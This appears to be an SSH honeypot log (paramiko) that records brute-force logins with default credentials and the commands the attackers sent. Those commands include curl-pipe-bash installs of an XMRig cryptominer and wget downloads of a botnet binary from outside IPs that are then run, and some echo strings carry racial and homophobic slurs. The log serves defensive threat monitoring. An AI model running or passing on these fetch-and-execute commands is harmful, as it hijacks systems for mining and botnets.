+2021-10-29 13:52:34,783 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:52:34,783 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:52:34,940 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:52:34,940 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:52:44,783 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:53:28,792 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:53:28,797 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:53:29,738 - root - INFO - new client credentials (209.141.60.103): username: root, password: test
+2021-10-29 13:53:29,739 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:53:29,893 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:53:29,893 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:53:29,893 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:53:29,893 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:53:29,893 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:53:30,049 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:53:30,049 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:53:39,893 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:53:42,927 - root - INFO - New connection from: 199.195.254.63
+2021-10-29 13:53:43,006 - paramiko.transport - ERROR - Exception: Error reading SSH protocol banner
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2211, in _check_banner
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -     buf = self.packetizer.readline(timeout)
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/packet.py", line 380, in readline
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -     buf += self._read_timeout(timeout)
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/packet.py", line 609, in _read_timeout
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -     raise EOFError()
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR - EOFError
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR - 
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR - During handling of the above exception, another exception occurred:
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR - 
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR - Traceback (most recent call last):
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2039, in run
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -     self._check_banner()
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -   File "/usr/local/lib/python3.10/site-packages/paramiko/transport.py", line 2215, in _check_banner
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR -     raise SSHException(
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR - paramiko.ssh_exception.SSHException: Error reading SSH protocol banner
+2021-10-29 13:53:43,007 - paramiko.transport - ERROR - 
+2021-10-29 13:53:56,827 - root - INFO - New connection from: 199.195.254.63
+2021-10-29 13:53:56,828 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:54:07,945 - root - INFO - new client credentials (199.195.254.63): username: root, password: eve
+2021-10-29 13:54:07,946 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:54:08,166 - root - INFO - client called check_channel_request (199.195.254.63): session
+2021-10-29 13:54:08,166 - root - INFO - Client mac (199.195.254.63): hmac-sha1
+2021-10-29 13:54:08,166 - root - INFO - Client compression (199.195.254.63): none
+2021-10-29 13:54:08,166 - root - INFO - Client SSH version (199.195.254.63): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:54:08,166 - root - INFO - Client SSH cipher (199.195.254.63): aes128-ctr
+2021-10-29 13:54:08,398 - root - INFO - New URL detected (199.195.254.63): http://198.98.62.92/x86_64
+2021-10-29 13:54:08,399 - root - INFO - New IP-based URL detected (199.195.254.63): 198.98.62.92/x86_64;
+2021-10-29 13:54:08,399 - root - INFO - client sent command via check_channel_exec_request (199.195.254.63): b'cat /etc/issue; cd /tmp/; rm -rf x86*; wget http://198.98.62.92/x86_64; chmod 777 *; ./x86_64 x86xhed; echo hraztalag on top niggers, Molov is a fag'
+2021-10-29 13:54:18,166 - root - INFO - ** Client (199.195.254.63): never asked for a shell
+2021-10-29 13:54:23,710 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:54:23,711 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:54:24,495 - root - INFO - new client credentials (209.141.60.103): username: deployer, password: deployer
+2021-10-29 13:54:24,496 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:54:24,649 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:54:24,649 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:54:24,649 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:54:24,649 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:54:24,649 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:54:25,587 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:54:25,588 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:54:34,650 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:54:57,021 - root - INFO - New connection from: 199.195.254.63
+2021-10-29 13:54:57,024 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:54:57,790 - root - INFO - New connection from: 130.209.157.50
+2021-10-29 13:54:57,791 - paramiko.transport - INFO - Connected (version 2.0, client PuTTY_Release_0.76)
+2021-10-29 13:54:58,064 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:54:58,064 - root - INFO - client called get_allowed_auths (130.209.157.50) with username ssh ubuntu
+2021-10-29 13:54:59,315 - root - INFO - new client credentials (199.195.254.63): username: root, password: admin123
+2021-10-29 13:54:59,316 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:54:59,550 - root - INFO - client called check_channel_request (199.195.254.63): session
+2021-10-29 13:54:59,550 - root - INFO - Client mac (199.195.254.63): hmac-sha1
+2021-10-29 13:54:59,550 - root - INFO - Client compression (199.195.254.63): none
+2021-10-29 13:54:59,550 - root - INFO - Client SSH version (199.195.254.63): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:54:59,550 - root - INFO - Client SSH cipher (199.195.254.63): aes128-ctr
+2021-10-29 13:54:59,748 - root - INFO - New URL detected (199.195.254.63): http://198.98.62.92/x86_64
+2021-10-29 13:54:59,749 - root - INFO - New IP-based URL detected (199.195.254.63): 198.98.62.92/x86_64;
+2021-10-29 13:54:59,749 - root - INFO - client sent command via check_channel_exec_request (199.195.254.63): b'cat /etc/issue; cd /tmp/; rm -rf x86*; wget http://198.98.62.92/x86_64; chmod 777 *; ./x86_64 x86xhed; echo hraztalag on top niggers, Molov is a fag'
+2021-10-29 13:55:00,117 - root - INFO - new client credentials (130.209.157.50): username: ssh ubuntu, password: 
+2021-10-29 13:55:00,117 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:55:00,145 - root - INFO - client called check_channel_request (130.209.157.50): session
+2021-10-29 13:55:00,145 - root - INFO - Client mac (130.209.157.50): hmac-sha2-256
+2021-10-29 13:55:00,145 - root - INFO - Client compression (130.209.157.50): none
+2021-10-29 13:55:00,145 - root - INFO - Client SSH version (130.209.157.50): SSH-2.0-PuTTY_Release_0.76
+2021-10-29 13:55:00,145 - root - INFO - Client SSH cipher (130.209.157.50): aes256-ctr
+2021-10-29 13:55:07,400 - root - INFO - Command received (130.209.157.50): ls
+2021-10-29 13:55:07,400 - root - INFO - Response from honeypot (130.209.157.50): 
+2021-10-29 13:55:09,550 - root - INFO - ** Client (199.195.254.63): never asked for a shell
+2021-10-29 13:55:15,449 - root - INFO - Command received (130.209.157.50): nano users.txt
+2021-10-29 13:55:16,688 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:55:16,694 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:55:17,481 - root - INFO - new client credentials (209.141.60.103): username: ossuser, password: Changeme_123
+2021-10-29 13:55:17,481 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:55:17,629 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:55:17,630 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:55:17,630 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:55:17,630 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:55:17,630 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:55:17,778 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:55:17,779 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:55:27,630 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:55:54,107 - root - INFO - New connection from: 199.195.254.63
+2021-10-29 13:55:54,114 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:55:57,739 - root - INFO - new client credentials (199.195.254.63): username: ossuser, password: Changeme_123
+2021-10-29 13:55:57,739 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:55:57,953 - root - INFO - client called check_channel_request (199.195.254.63): session
+2021-10-29 13:55:57,954 - root - INFO - Client mac (199.195.254.63): hmac-sha1
+2021-10-29 13:55:57,954 - root - INFO - Client compression (199.195.254.63): none
+2021-10-29 13:55:57,954 - root - INFO - Client SSH version (199.195.254.63): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:55:57,954 - root - INFO - Client SSH cipher (199.195.254.63): aes128-ctr
+2021-10-29 13:55:58,184 - root - INFO - New URL detected (199.195.254.63): http://198.98.62.92/x86_64
+2021-10-29 13:55:58,184 - root - INFO - New IP-based URL detected (199.195.254.63): 198.98.62.92/x86_64;
+2021-10-29 13:55:58,185 - root - INFO - client sent command via check_channel_exec_request (199.195.254.63): b'cat /etc/issue; cd /tmp/; rm -rf x86*; wget http://198.98.62.92/x86_64; chmod 777 *; ./x86_64 x86xhed; echo hraztalag on top niggers, Molov is a fag'
+2021-10-29 13:56:07,954 - root - INFO - ** Client (199.195.254.63): never asked for a shell
+2021-10-29 13:56:09,858 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:56:09,858 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:56:10,634 - root - INFO - new client credentials (209.141.60.103): username: admin, password: admin
+2021-10-29 13:56:10,634 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:56:10,796 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:56:10,796 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:56:10,796 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:56:10,796 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:56:10,796 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:56:10,947 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:56:10,948 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:56:20,796 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:56:51,780 - root - INFO - New connection from: 199.195.254.63
+2021-10-29 13:56:51,781 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:56:55,318 - root - INFO - new client credentials (199.195.254.63): username: root, password: 1111111
+2021-10-29 13:56:55,319 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:56:55,557 - root - INFO - client called check_channel_request (199.195.254.63): session
+2021-10-29 13:56:55,558 - root - INFO - Client mac (199.195.254.63): hmac-sha1
+2021-10-29 13:56:55,558 - root - INFO - Client compression (199.195.254.63): none
+2021-10-29 13:56:55,558 - root - INFO - Client SSH version (199.195.254.63): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:56:55,558 - root - INFO - Client SSH cipher (199.195.254.63): aes128-ctr
+2021-10-29 13:56:56,312 - root - INFO - New URL detected (199.195.254.63): http://198.98.62.92/x86_64
+2021-10-29 13:56:56,312 - root - INFO - New IP-based URL detected (199.195.254.63): 198.98.62.92/x86_64;
+2021-10-29 13:56:56,313 - root - INFO - client sent command via check_channel_exec_request (199.195.254.63): b'cat /etc/issue; cd /tmp/; rm -rf x86*; wget http://198.98.62.92/x86_64; chmod 777 *; ./x86_64 x86xhed; echo hraztalag on top niggers, Molov is a fag'
+2021-10-29 13:57:03,493 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:57:03,497 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:57:04,265 - root - INFO - new client credentials (209.141.60.103): username: admin, password: 123456
+2021-10-29 13:57:04,265 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:57:04,414 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:57:04,415 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:57:04,415 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:57:04,415 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:57:04,415 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:57:04,568 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:57:04,568 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:57:05,558 - root - INFO - ** Client (199.195.254.63): never asked for a shell
+2021-10-29 13:57:14,415 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:57:48,506 - root - INFO - New connection from: 199.195.254.63
+2021-10-29 13:57:48,509 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:57:50,857 - root - INFO - new client credentials (199.195.254.63): username: root, password: 0
+2021-10-29 13:57:50,857 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:57:51,079 - root - INFO - client called check_channel_request (199.195.254.63): session
+2021-10-29 13:57:51,079 - root - INFO - Client mac (199.195.254.63): hmac-sha1
+2021-10-29 13:57:51,079 - root - INFO - Client compression (199.195.254.63): none
+2021-10-29 13:57:51,080 - root - INFO - Client SSH version (199.195.254.63): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:57:51,080 - root - INFO - Client SSH cipher (199.195.254.63): aes128-ctr
+2021-10-29 13:57:51,784 - root - INFO - New URL detected (199.195.254.63): http://198.98.62.92/x86_64
+2021-10-29 13:57:51,785 - root - INFO - New IP-based URL detected (199.195.254.63): 198.98.62.92/x86_64;
+2021-10-29 13:57:51,785 - root - INFO - client sent command via check_channel_exec_request (199.195.254.63): b'cat /etc/issue; cd /tmp/; rm -rf x86*; wget http://198.98.62.92/x86_64; chmod 777 *; ./x86_64 x86xhed; echo hraztalag on top niggers, Molov is a fag'
+2021-10-29 13:57:58,916 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:57:58,921 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:58:00,216 - root - INFO - new client credentials (209.141.60.103): username: ubuntu, password: ubuntu
+2021-10-29 13:58:00,216 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:58:00,424 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:58:00,424 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:58:00,424 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:58:00,424 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:58:00,425 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:58:00,591 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:58:00,591 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:58:01,080 - root - INFO - ** Client (199.195.254.63): never asked for a shell
+2021-10-29 13:58:10,425 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:58:44,328 - root - INFO - New connection from: 199.195.254.63
+2021-10-29 13:58:44,333 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:58:48,956 - root - INFO - new client credentials (199.195.254.63): username: root, password: root
+2021-10-29 13:58:48,956 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:58:49,155 - root - INFO - client called check_channel_request (199.195.254.63): session
+2021-10-29 13:58:49,156 - root - INFO - Client mac (199.195.254.63): hmac-sha1
+2021-10-29 13:58:49,156 - root - INFO - Client compression (199.195.254.63): none
+2021-10-29 13:58:49,156 - root - INFO - Client SSH version (199.195.254.63): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:58:49,156 - root - INFO - Client SSH cipher (199.195.254.63): aes128-ctr
+2021-10-29 13:58:49,360 - root - INFO - New URL detected (199.195.254.63): http://198.98.62.92/x86_64
+2021-10-29 13:58:49,360 - root - INFO - New IP-based URL detected (199.195.254.63): 198.98.62.92/x86_64;
+2021-10-29 13:58:49,360 - root - INFO - client sent command via check_channel_exec_request (199.195.254.63): b'cat /etc/issue; cd /tmp/; rm -rf x86*; wget http://198.98.62.92/x86_64; chmod 777 *; ./x86_64 x86xhed; echo hraztalag on top niggers, Molov is a fag'
+2021-10-29 13:58:52,843 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:58:52,844 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:58:53,628 - root - INFO - new client credentials (209.141.60.103): username: root, password: root123
+2021-10-29 13:58:53,629 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:58:53,784 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:58:53,784 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:58:53,784 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:58:53,784 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:58:53,784 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:58:53,941 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:58:53,941 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 13:58:59,156 - root - INFO - ** Client (199.195.254.63): never asked for a shell
+2021-10-29 13:59:03,784 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 13:59:10,764 - root - INFO - New connection from: 222.187.232.39
+2021-10-29 13:59:12,192 - paramiko.transport - INFO - Connected (version 2.0, client PUTTY)
+2021-10-29 13:59:14,603 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 13:59:14,606 - root - INFO - client called get_allowed_auths (222.187.232.39) with username root
+2021-10-29 13:59:14,855 - root - INFO - new client credentials (222.187.232.39): username: root, password: 147852
+2021-10-29 13:59:14,855 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:59:15,119 - paramiko.transport - INFO - Disconnect (code 11): 
+2021-10-29 13:59:37,683 - root - INFO - New connection from: 199.195.254.63
+2021-10-29 13:59:37,685 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:59:38,793 - root - INFO - new client credentials (199.195.254.63): username: debianuser, password: 1qazXSW@
+2021-10-29 13:59:38,793 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:59:40,023 - root - INFO - client called check_channel_request (199.195.254.63): session
+2021-10-29 13:59:40,023 - root - INFO - Client mac (199.195.254.63): hmac-sha1
+2021-10-29 13:59:40,024 - root - INFO - Client compression (199.195.254.63): none
+2021-10-29 13:59:40,024 - root - INFO - Client SSH version (199.195.254.63): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:59:40,024 - root - INFO - Client SSH cipher (199.195.254.63): aes128-ctr
+2021-10-29 13:59:40,231 - root - INFO - New URL detected (199.195.254.63): http://198.98.62.92/x86_64
+2021-10-29 13:59:40,232 - root - INFO - New IP-based URL detected (199.195.254.63): 198.98.62.92/x86_64;
+2021-10-29 13:59:40,232 - root - INFO - client sent command via check_channel_exec_request (199.195.254.63): b'cat /etc/issue; cd /tmp/; rm -rf x86*; wget http://198.98.62.92/x86_64; chmod 777 *; ./x86_64 x86xhed; echo hraztalag on top niggers, Molov is a fag'
+2021-10-29 13:59:50,024 - root - INFO - ** Client (199.195.254.63): never asked for a shell
+2021-10-29 13:59:50,902 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 13:59:50,903 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 13:59:51,682 - root - INFO - new client credentials (209.141.60.103): username: ubuntu, password: 123456
+2021-10-29 13:59:51,682 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 13:59:51,834 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 13:59:51,835 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 13:59:51,835 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 13:59:51,835 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 13:59:51,835 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 13:59:51,989 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 13:59:51,990 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:00:01,835 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:00:51,709 - root - INFO - New connection from: 209.141.60.103
+2021-10-29 14:00:51,711 - paramiko.transport - INFO - Connected (version 2.0, client libssh2_1.4.3)
+2021-10-29 14:00:52,485 - root - INFO - new client credentials (209.141.60.103): username: ansible, password: ansible123
+2021-10-29 14:00:52,485 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:00:52,649 - root - INFO - client called check_channel_request (209.141.60.103): session
+2021-10-29 14:00:52,650 - root - INFO - Client mac (209.141.60.103): hmac-sha1
+2021-10-29 14:00:52,650 - root - INFO - Client compression (209.141.60.103): none
+2021-10-29 14:00:52,650 - root - INFO - Client SSH version (209.141.60.103): SSH-2.0-libssh2_1.4.3
+2021-10-29 14:00:52,650 - root - INFO - Client SSH cipher (209.141.60.103): aes128-ctr
+2021-10-29 14:00:52,799 - root - INFO - New URL detected (209.141.60.103): http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh
+2021-10-29 14:00:52,799 - root - INFO - client sent command via check_channel_exec_request (209.141.60.103): b'curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA'
+2021-10-29 14:01:02,650 - root - INFO - ** Client (209.141.60.103): never asked for a shell
+2021-10-29 14:01:02,712 - root - INFO - New connection from: 103.64.12.112
+2021-10-29 14:01:02,713 - paramiko.transport - INFO - Connected (version 2.0, client PUTTY)
+2021-10-29 14:01:03,819 - paramiko.transport - INFO - Auth rejected (none).
+2021-10-29 14:01:03,819 - root - INFO - client called get_allowed_auths (103.64.12.112) with username root
+2021-10-29 14:01:04,039 - root - INFO - new client credentials (103.64.12.112): username: root, password: 147852
+2021-10-29 14:01:04,039 - paramiko.transport - INFO - Auth granted (password).
+2021-10-29 14:01:04,259 - root - INFO - client called check_channel_request (103.64.12.112): session
+2021-10-29 14:01:04,260 - root - INFO - Client mac (103.64.12.112): hmac-sha2-256
+2021-10-29 14:01:04,260 - root - INFO - Client compression (103.64.12.112): none
+2021-10-29 14:01:04,260 - root - INFO - Client SSH version (103.64.12.112): SSH-2.0-PUTTY
+2021-10-29 14:01:04,260 - root - INFO - Client SSH cipher (103.64.12.112): aes128-ctr
+2021-10-29 14:01:04,480 - root - INFO - New URL detected (103.64.12.112): http://104.233.240.148/1.txt
+2021-10-29 14:01:04,481 - root - INFO - New URL detected (103.64.12.112): http://104.233.240.148/1.txt
+2021-10-29 14:01:04,481 - root - INFO - New URL detected (103.64.12.112): http://104.233.240.148/1.txt
+2021-10-29 14:01:04,481 - root - INFO - New URL detected (103.64.12.112): http://104.233.240.148/1a.txt
+2021-10-29 14:01:04,481 - root - INFO - New URL detected (103.64.12.112): http://104.233.240.148/1a.txt
+2021-10-29 14:01:04,481 - root - INFO - New URL detected (103.64.12.112): http://104.233.240.148/1a.txt
+2021-10-29 14:01:04,481 - root - INFO - New IP-based URL detected (103.64.12.112): 104.233.240.148/1.txt
+2021-10-29 14:01:04,482 - root - INFO - New IP-based URL detected (103.64.12.112): 104.233.240.148/1.txt
+2021-10-29 14:01:04,482 - root - INFO - New IP-based URL detected (103.64.12.112): 104.233.240.148/1.txt
+2021-10-29 14:01:04,482 - root - INFO - New IP-based URL detected (103.64.12.112): 104.233.240.148/1a.txt
+2021-10-29 14:01:04,482 - root - INFO - New IP-based URL detected (103.64.12.112): 104.233.240.148/1a.txt
+2021-10-29 14:01:04,482 - root - INFO - New IP-based URL detected (103.64.12.112): 104.233.240.148/1a.txt
